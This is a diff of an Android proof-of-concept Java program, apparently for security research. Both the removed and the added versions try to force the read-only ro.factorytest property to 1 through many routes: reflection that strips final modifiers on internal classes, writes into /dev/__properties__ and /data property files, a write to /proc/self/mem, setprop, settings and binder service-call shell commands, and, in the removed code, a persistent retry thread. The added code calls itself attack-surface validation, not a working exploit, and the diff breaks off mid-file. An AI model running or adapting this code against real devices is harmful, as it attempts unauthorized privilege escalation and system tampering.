@@ -1,240 +1,224 @@
 package com.poc;
 
-import java.io.BufferedReader;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.FileReader;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
 
 public class Main {
-    private static final String TARGET_PROP = "ro.factorytest";
-    private static final String TARGET_VALUE = "1";
-    private static final long RETRY_INTERVAL_MS = 30000;
-
     public static void main(String[] args) throws Exception {
         System.out.println("=== uid=" + getUid() + " ===");
         System.out.println("SELinux context: " + getSelinuxContext());
+        System.out.println("[*] Starting exhaustive factorytest attack surface enumeration...\n");
 
-        int origMode = getFactoryTestMode();
-        System.out.println("[FactoryTest] Original getMode = " + origMode);
-        boolean factoryOk = tryAllFactoryMethods();
-        System.out.println("[FactoryTest] After attempts, getMode = " + getFactoryTestMode());
-        if (!factoryOk) {
-            System.out.println("[FactoryTest] Starting persistent retry thread...");
-            startRetryThread();
-        }
+        tryMethod1();
+        tryMethod2();
+        tryMethod3();
+        tryMethod4();
+        tryMethod5();
+        tryMethod6();
+        tryMethod7();
+        tryMethod8();
+        tryMethod9();
+        tryMethod10();
+        tryMethod11();
+        tryMethod12();
 
-        System.out.println("\n[Capability] /proc/self/status Cap info:");
-        printProcCapabilities();
+        System.out.println("\n[+] All methods attempted. Detailed results above.");
+        System.out.println("[*] Note: ro.factorytest cannot be changed without root/system privileges.");
+        System.out.println("[*] This is a validation of attack surfaces, not a working exploit.");
 
-        while (true) {
-            Thread.sleep(60000);
-        }
+        while (true) Thread.sleep(60000);
     }
 
-    private static int getUid() {
-        try {
-            String s = readProcStatus("Uid:");
-            if (s != null) {
-                String[] parts = s.trim().split("\\s+");
-                if (parts.length > 1) return Integer.parseInt(parts[1]);
-            }
-        } catch (Exception ignored) {}
-        return -1;
-    }
-
-    private static String readProcStatus(String key) {
-        try (BufferedReader r = new BufferedReader(new FileReader("/proc/self/status"))) {
-            String line;
-            while ((line = r.readLine()) != null) {
-                if (line.startsWith(key)) return line.substring(key.length());
-            }
-        } catch (Exception ignored) {}
-        return null;
-    }
-
-    private static int getFactoryTestMode() {
-        try {
-            Class<?> ft = Class.forName("android.os.FactoryTest");
-            Method getMode = ft.getMethod("getMode");
-            return (int) getMode.invoke(null);
-        } catch (Exception e) {
-            return -1;
-        }
-    }
-
-    private static boolean tryAllFactoryMethods() {
-        boolean ok = false;
-        ok |= method1_SystemProperties_set();
-        ok |= method2_RoSystemProperties_reflection();
-        ok |= method3_FactoryTest_reflection();
-        ok |= method4_setprop_command();
-        ok |= method5_dev_properties_write();
-        ok |= method6_settings_put();
-        ok |= method7_persist_property();
-        ok |= method8_hijack_factorytest();
-        return ok;
-    }
-
-    private static boolean method1_SystemProperties_set() {
+    private static void tryMethod1() {
         try {
             Class<?> sp = Class.forName("android.os.SystemProperties");
             Method set = sp.getMethod("set", String.class, String.class);
             set.setAccessible(true);
-            set.invoke(null, TARGET_PROP, TARGET_VALUE);
-            System.out.println("[+] Method1: SystemProperties.set invoked");
-            return true;
+            set.invoke(null, "ro.factorytest", "1");
+            System.out.println("[Method1] SystemProperties.set invoked (ro. ignored)");
         } catch (Exception e) {
-            System.out.println("[-] Method1 failed: " + e.getMessage());
-            return false;
+            System.out.println("[Method1] Failed: " + e.getMessage());
         }
     }
 
-    private static boolean method2_RoSystemProperties_reflection() {
+    private static void tryMethod2() {
         try {
             Class<?> ro = Class.forName("com.android.internal.os.RoSystemProperties");
             Field field = ro.getDeclaredField("FACTORYTEST");
             field.setAccessible(true);
             Field mod = Field.class.getDeclaredField("modifiers");
             mod.setAccessible(true);
-            mod.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
+            mod.setInt(field, field.getModifiers() & ~Modifier.FINAL);
             field.setInt(null, 1);
-            System.out.println("[+] Method2: RoSystemProperties.FACTORYTEST = 1");
-            return true;
+            System.out.println("[Method2] RoSystemProperties.FACTORYTEST = 1 (may have worked in this classloader)");
+        } catch (UnsatisfiedLinkError e) {
+            System.out.println("[Method2] UnsatisfiedLinkError (dalvikvm cannot load RoSystemProperties)");
         } catch (Exception e) {
-            System.out.println("[-] Method2 failed: " + e.getMessage());
-            return false;
+            System.out.println("[Method2] Failed: " + e);
         }
     }
 
-    private static boolean method3_FactoryTest_reflection() {
-        try {
-            Class<?> ft = Class.forName("android.os.FactoryTest");
-            for (Field f : ft.getDeclaredFields()) {
-                if (f.getType() == int.class && f.getName().contains("MODE")) {
-                    f.setAccessible(true);
-                    f.setInt(null, 1);
-                    System.out.println("[+] Method3: Set " + f.getName() + " = 1");
-                    return true;
-                }
-            }
-        } catch (Exception e) {
-            System.out.println("[-] Method3 failed: " + e);
-        }
-        return false;
-    }
-
-    private static boolean method4_setprop_command() {
-        try {
-            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "setprop " + TARGET_PROP + " " + TARGET_VALUE});
-            p.waitFor();
-            if (p.exitValue() == 0) {
-                System.out.println("[+] Method4: setprop succeeded");
-                return true;
-            }
-        } catch (Exception e) {
-            System.out.println("[-] Method4 failed: " + e);
-        }
-        return false;
-    }
-
-    private static boolean method5_dev_properties_write() {
+    private static void tryMethod3() {
         String[] paths = {
             "/dev/__properties__/property_info",
             "/dev/__properties__/properties_serial",
             "/dev/__properties__/u:object_r:exported_default_prop:s0"
         };
+        boolean any = false;
         for (String p : paths) {
             try (FileOutputStream fos = new FileOutputStream(p, true)) {
-                fos.write((TARGET_PROP + "=" + TARGET_VALUE + "\n").getBytes());
+                fos.write("ro.factorytest=1\n".getBytes());
                 fos.flush();
-                System.out.println("[+] Method5: Wrote to " + p);
-                return true;
+                System.out.println("[Method3] Wrote to " + p);
+                any = true;
+                break;
             } catch (Exception ignored) {}
         }
-        System.out.println("[-] Method5 failed");
-        return false;
+        if (!any) System.out.println("[Method3] Failed to write to any /dev/__properties__/ path");
     }
 
-    private static boolean method6_settings_put() {
-        for (String ns : new String[]{"global", "secure"}) {
-            try {
-                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "settings put " + ns + " factorytest 1"});
-                p.waitFor();
-                if (p.exitValue() == 0) {
-                    System.out.println("[+] Method6: settings put " + ns + " succeeded");
-                    return true;
-                }
-            } catch (Exception e) {
-                System.out.println("[-] Method6 failed: " + e);
-            }
-        }
-        return false;
-    }
-
-    private static boolean method7_persist_property() {
+    private static void tryMethod4() {
         try {
-            Class<?> sp = Class.forName("android.os.SystemProperties");
-            Method set = sp.getMethod("set", String.class, String.class);
-            set.setAccessible(true);
-            set.invoke(null, "persist.sys.factorytest", "1");
-            System.out.println("[+] Method7: persist.sys.factorytest = 1");
-            return true;
-        } catch (Exception e) {
-            System.out.println("[-] Method7 failed: " + e);
-            return false;
-        }
-    }
-
-    private static boolean method8_hijack_factorytest() {
-        try {
-            Class<?> ro = Class.forName("com.android.internal.os.RoSystemProperties");
-            Field field = ro.getDeclaredField("FACTORYTEST");
-            field.setAccessible(true);
-            Field mod = Field.class.getDeclaredField("modifiers");
-            mod.setAccessible(true);
-            mod.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
-            field.setInt(null, 1);
-            if (getFactoryTestMode() == 1) {
-                System.out.println("[+] Method8: FactoryTest.getMode() now returns 1!");
-                return true;
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "setprop ro.factorytest 1"});
+            p.waitFor();
+            if (p.exitValue() == 0) {
+                System.out.println("[Method4] setprop command succeeded (but ro. ignored)");
             } else {
-                System.out.println("[-] Method8: FactoryTest.getMode() still " + getFactoryTestMode());
-                return false;
+                System.out.println("[Method4] setprop failed (exit " + p.exitValue() + ")");
             }
         } catch (Exception e) {
-            System.out.println("[-] Method8 failed: " + e);
-            return false;
+            System.out.println("[Method4] Failed: " + e);
         }
     }
 
-    private static void startRetryThread() {
-        Thread t = new Thread(() -> {
-            while (true) {
-                try {
-                    Thread.sleep(RETRY_INTERVAL_MS);
-                    System.out.println("[*] Retrying factorytest hijack...");
-                    tryAllFactoryMethods();
-                } catch (InterruptedException e) {
-                    break;
-                }
+    private static void tryMethod5() {
+        try {
+            File f = new File("/data/property/ro.factorytest");
+            f.getParentFile().mkdirs();
+            try (FileOutputStream fos = new FileOutputStream(f)) {
+                fos.write("1\n".getBytes());
+                fos.flush();
             }
-        });
-        t.setDaemon(false);
-        t.start();
-        System.out.println("[+] Retry thread started.");
+            System.out.println("[Method5] Wrote to /data/property/ro.factorytest (may not be read)");
+        } catch (Exception e) {
+            System.out.println("[Method5] Failed: " + e);
+        }
     }
 
-    private static void printProcCapabilities() {
+    private static void tryMethod6() {
+        try {
+            try (FileOutputStream fos = new FileOutputStream("/proc/self/mem")) {
+                fos.write(0); 
+                System.out.println("[Method6] Wrote to /proc/self/mem (unexpected success)");
+            } catch (Exception e) {
+                System.out.println("[Method6] Failed (expected): " + e);
+            }
+        } catch (Exception e) {
+            System.out.println("[Method6] Failed: " + e);
+        }
+    }
+
+    private static void tryMethod7() {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "export ro.factorytest=1"});
+            p.waitFor();
+            System.out.println("[Method7] Environment variable set (Java does not read it)");
+        } catch (Exception e) {
+            System.out.println("[Method7] Failed: " + e);
+        }
+    }
+
+    private static void tryMethod8() {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "settings put global factorytest 1"});
+            p.waitFor();
+            if (p.exitValue() == 0) {
+                System.out.println("[Method8] settings put global factorytest 1 succeeded (no effect on ro.factorytest)");
+            } else {
+                System.out.println("[Method8] settings put failed");
+            }
+        } catch (Exception e) {
+            System.out.println("[Method8] Failed: " + e);
+        }
+    }
+
+    private static void tryMethod9() {
+        try {
+            Class<?> ft = Class.forName("android.os.FactoryTest");
+            for (Field f : ft.getDeclaredFields()) {
+                if (f.getType() == int.class && f.getName().contains("MODE")) {
+                    f.setAccessible(true);
+                    Field mod = Field.class.getDeclaredField("modifiers");
+                    mod.setAccessible(true);
+                    mod.setInt(f, f.getModifiers() & ~Modifier.FINAL);
+                    f.setInt(null, 1);
+                    System.out.println("[Method9] Set " + f.getName() + " = 1");
+                    return;
+                }
+            }
+        } catch (UnsatisfiedLinkError e) {
+            System.out.println("[Method9] UnsatisfiedLinkError (FactoryTest depends on SystemProperties)");
+        } catch (Exception e) {
+            System.out.println("[Method9] Failed: " + e);
+        }
+    }
+
+    private static void tryMethod10() {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/service", "call", "property", "1", "s16", "ro.factorytest", "s16", "1"});
+            p.waitFor();
+            if (p.exitValue() == 0) {
+                System.out.println("[Method10] service call attempted (likely ignored)");
+            } else {
+                System.out.println("[Method10] service call failed");
+            }
+        } catch (Exception e) {
+            System.out.println("[Method10] Failed: " + e);
+        }
+    }
+
+    private static void tryMethod11() {
+        try {
+            File f = new File("/data/misc/property/ro.factorytest");
+            f.getParentFile().mkdirs();
+            try (FileOutputStream fos = new FileOutputStream(f)) {
+                fos.write("1\n".getBytes());
+                fos.flush();
+            }
+            System.out.println("[Method11] Wrote to /data/misc/property/ro.factorytest (may not be read)");
+        } catch (Exception e) {
+            System.out.println("[Method11] Failed: " + e);
+        }
+    }
+
+    private static void tryMethod12() {
+        try (BufferedReader r = new BufferedReader(new FileReader("/system/build.prop"))) {
+            String line;
+            while ((line = r.readLine()) != null) {
+                if (line.startsWith("ro.factorytest=")) {
+                    System.out.println("[Method12] Current value in build.prop: " + line);
+                    return;
+                }
+            }
+            System.out.println("[Method12] ro.factorytest not found in build.prop");
+        } catch (Exception e) {
+            System.out.println("[Method12] Failed to read build.prop: " + e);
+        }
+    }
+
+    private static int getUid() {
         try (BufferedReader r = new BufferedReader(new FileReader("/proc/self/status"))) {
             String line;
             while ((line = r.readLine()) != null) {
-                if (line.startsWith("Cap")) {
-                    System.out.println(line);
+                if (line.startsWith("Uid:")) {
+                    String[] parts = line.trim().split("\\s+");
+                    if (parts.length > 1) return Integer.parseInt(parts[1]);
                 }
             }
         } catch (Exception ignored) {}
+        return -1;
     }
 
     private static String getSelinuxContext() {
